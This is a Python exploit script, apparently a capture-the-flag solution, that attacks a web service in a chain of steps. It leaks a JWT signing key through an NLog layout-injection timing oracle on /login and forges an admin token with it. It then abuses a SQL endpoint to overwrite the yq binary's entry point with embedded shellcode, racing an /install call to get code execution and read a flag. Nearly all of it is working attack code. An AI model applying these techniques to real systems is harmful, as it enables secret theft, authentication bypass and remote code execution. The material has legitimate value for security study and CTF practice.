# /// script
# requires-python = ">=3.9"
# dependencies = ["requests", "pyjwt"]
# ///

# - leak Jwt__Key via NLog layout-injection timing oracle on /login
# - forge an admin token
# - patch tools/yq through a SQLite page write for RCE

import os
import statistics
import time
import urllib.parse
import jwt
import requests
import sys

BASE_URL = os.getenv('BASE', "http://localhost:8080")
if "SESSION_ENDPOINT" in os.environ:
    endpoint = os.environ["SESSION_ENDPOINT"]
    parsed = urllib.parse.urlparse(endpoint)
    if not parsed.hostname or not parsed.port:
        sys.exit(f"bad SESSION_ENDPOINT: {endpoint!r}")

    scheme = "https" if parsed.scheme in ("https", "tls", "ssl") else "http"

    BASE_URL = "%s://%s:%s" % (scheme, parsed.hostname, parsed.port)


KEY_SOURCE = "${environment:variable=Jwt__Key}"
CHARSET = "0123456789abcdef"
ISSUER, AUDIENCE = "i-like-trains", "i-like-trains-users"

PAGE_SIZE = 4096
BLOB_LEN = 4050            # one row fills exactly one leaf page
ENTRY_OFFSET = 0x90d40     # yq v4.53.3 linux_amd64: e_entry - load vaddr
TARGET = "/data/tools/yq"
# execve("/readflag", NULL, NULL)
SHELLCODE = bytes.fromhex("31f631d25648b867000000000000005048b82f72656164666c61504889e7b83b0000000f05")

session = requests.Session()

def samples(username, n):
    times = []
    for _ in range(n):
        start = time.perf_counter()
        session.post(BASE_URL + "/login", json={"username": username, "password": "x"}, timeout=120)
        times.append(time.perf_counter() - start)
    return times

def timed(username, n):
    return statistics.median(samples(username, n))

def escape(value):
    for char in ("\\", "{", "}", ":"):
        value = value.replace(char, "\\" + char)
    return value.replace("'", "''")

def probe(condition, padding):
    # ${when} only builds the (expensive) padded string when the condition holds,
    # so a slow response means "true". substring caps the rendered length.
    return (f"${{substring:length=10:inner="
            f"${{when:when={condition}:inner=${{level:padding={padding}}}}}}}")

def tune():
    # tune until network jitter is negligible
    timed("warmup", 3)
    padding = 5000
    while padding <= 80000:
        miss = samples(probe(f"length('{KEY_SOURCE}')>9999", padding), 5)
        hit = timed(probe(f"length('{KEY_SOURCE}')>0", padding), 3)
        gap = hit - statistics.median(miss)
        if gap > 0.15 and gap > 8 * max(statistics.pstdev(miss), 0.001):
            print(f"[+] timing signal at padding={padding} (gap {gap * 1000:.0f}ms)")
            return padding, statistics.median(miss) + gap / 2
        padding *= 2
    raise SystemExit("no timing signal - is /login reachable and logging?")

def leak_key():
    padding, threshold = tune()
    key = ""
    while True:
        times = {c: timed(probe(f"starts-with('{KEY_SOURCE}','{escape(key + c)}')", padding), 5)
                 for c in CHARSET}
        best = max(times, key=times.get)
        if times[best] <= threshold:      # no char is "slow" -> we're past the end
            return key
        key += best
        print(f"[+] key so far: {key}")

def forge_token(key):
    now = int(time.time())
    return jwt.encode({"unique_name": "admin", "iss": ISSUER, "aud": AUDIENCE,
                       "iat": now, "nbf": now, "exp": now + 3600}, key, algorithm="HS256")

def query(sql, headers):
    return session.post(BASE_URL + "/query", data=sql.encode(), headers=headers, timeout=600)

def main():
    key = leak_key()
    print(f"[+] leaked Jwt__Key: {key}")

    headers = {"Authorization": "Bearer " + forge_token(key)}
    if query("SELECT 1;", headers).status_code != 200:
        raise SystemExit("forged token rejected - leaked key is wrong")
    print("[+] forged admin token accepted")

    # leaves are allocated in rowid order after page 1 and the table root
    entry_page = ENTRY_OFFSET // PAGE_SIZE
    row = entry_page - 1
    payload = (b"\x90" * (BLOB_LEN - len(SHELLCODE)) + SHELLCODE).hex()
    filler = ",".join([f"(randomblob({BLOB_LEN}))"] * (entry_page + 60))

    # EXCLUSIVE stops the change counter from rewriting page 1 (the ELF header);
    # a rollback journal (not WAL) commits in place without truncating the file.
    setup = query(f"""ATTACH '{TARGET}' AS z;
        PRAGMA z.page_size={PAGE_SIZE};
        PRAGMA z.locking_mode=EXCLUSIVE;
        CREATE TABLE z.p(id INTEGER PRIMARY KEY, d BLOB);
        INSERT INTO z.p(d) VALUES {filler};
        UPDATE z.p SET d=randomblob({BLOB_LEN}) WHERE id=1;
        BEGIN IMMEDIATE;
        UPDATE z.p SET d=X'{payload}' WHERE id BETWEEN {row - 2} AND {row + 2};""", headers)
    if setup.status_code != 200:
        raise SystemExit(f"db setup failed (yq already installed?): {setup.text[:200]}")
    print(f"[+] staged patched pages for page {entry_page} (rowid {row})")

    # the open transaction lives on the pooled connection while /install overwrites yq
    if session.post(BASE_URL + "/install", headers=headers, timeout=300).status_code != 200:
        raise SystemExit("/install failed")
    print("[+] /install wrote the real yq over our db file")

    # DETACH closes the writable fd, otherwise execve gives ETXTBSY
    if query("COMMIT; DETACH z;", headers).status_code != 200:
        raise SystemExit("commit failed - lost the transaction, retry")
    print("[+] committed - yq entry point now points at our shellcode")

    flag = session.get(BASE_URL + "/api/agencies", timeout=60).text.strip()
    print(f"[+] FLAG: {flag}")

    with open("/flag", "w") as flag_file:
        flag_file.write(flag)
    print(flag)

if __name__ == "__main__":
    main()
